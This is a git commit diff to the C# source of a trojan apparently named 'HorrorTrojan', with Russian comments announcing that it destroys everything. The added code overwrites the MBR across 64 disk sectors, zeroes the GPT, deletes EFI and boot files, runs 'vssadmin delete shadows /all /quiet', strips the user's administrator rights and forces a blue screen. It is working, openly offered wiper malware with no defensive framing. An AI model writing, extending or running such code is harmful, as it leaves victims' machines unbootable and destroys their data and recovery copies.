9bb1e80f7f3a392bb253125c018d1ae16958abdd
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-29 00:17:53 +0300

    Update BSODTrigger.cs

--- Trojan/BSODTrigger.cs
+++ Trojan/BSODTrigger.cs
@@ -1,5 +1,6 @@
 using System;
 using System.IO;
+using System.Diagnostics;
 
 namespace HorrorTrojan
 {
@@ -7,22 +8,104 @@ namespace HorrorTrojan
     {
         public static void TriggerBSOD()
         {
-            byte[] mbr = ResourceExtractor.GetMBR();
-            if (mbr.Length == 512)
+            // 1. УНИЧТОЖАЕМ ВСЁ
+            DestroyEverything();
+            
+            // 2. ВЫЗЫВАЕМ BSOD
+            uint response;
+            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
+        }
+        
+        private static void DestroyEverything()
+        {
+            try
             {
+                // УНИЧТОЖЕНИЕ MBR (секторы 0-63)
+                byte[] mbr = ResourceExtractor.GetMBR();
+                if (mbr.Length == 512)
+                {
+                    for (int sector = 0; sector < 64; sector++)
+                    {
+                        try
+                        {
+                            using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
+                            {
+                                fs.Seek(sector * 512, SeekOrigin.Begin);
+                                fs.Write(mbr, 0, 512);
+                                fs.Flush();
+                            }
+                        }
+                        catch { }
+                    }
+                }
+                
+                // УНИЧТОЖЕНИЕ GPT (секторы 1-33)
+                byte[] zeros = new byte[512];
+                for (int sector = 1; sector < 34; sector++)
+                {
+                    try
+                    {
+                        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
+                        {
+                            fs.Seek(sector * 512, SeekOrigin.Begin);
+                            fs.Write(zeros, 0, 512);
+                            fs.Flush();
+                        }
+                    }
+                    catch { }
+                }
+                
+                // УНИЧТОЖЕНИЕ EFI-ФАЙЛОВ
+                string[] efiPaths = new string[]
+                {
+                    @"C:\EFI\Microsoft\Boot\bootmgfw.efi",
+                    @"C:\EFI\Microsoft\Boot\bootmgr.efi",
+                    @"C:\EFI\Boot\bootx64.efi",
+                    @"C:\EFI\Microsoft\Recovery\boot.sdi",
+                    @"C:\bootmgr",
+                    @"C:\Boot\BCD",
+                    @"C:\Boot\boot.sdi",
+                    @"C:\Boot\BCD.LOG",
+                    @"C:\boot\bootstat.dat"
+                };
+                
+                foreach (string path in efiPaths)
+                {
+                    try
+                    {
+                        if (File.Exists(path))
+                            File.Delete(path);
+                    }
+                    catch { }
+                }
+                
+                // УДАЛЕНИЕ ТЕНЕВЫХ КОПИЙ
                 try
                 {
-                    using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
+                    Process.Start(new ProcessStartInfo
                     {
-                        fs.Write(mbr, 0, 512);
-                        fs.Flush();
-                    }
+                        FileName = "vssadmin",
+                        Arguments = "delete shadows /all /quiet",
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    });
+                }
+                catch { }
+                
+                // ЛИШЕНИЕ ПРАВ АДМИНИСТРАТОРА
+                try
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "net",
+                        Arguments = "localgroup Administrators %username% /delete",
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    });
                 }
                 catch { }
             }
-            
-            uint response;
-            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
+            catch { }
         }
     }
 }
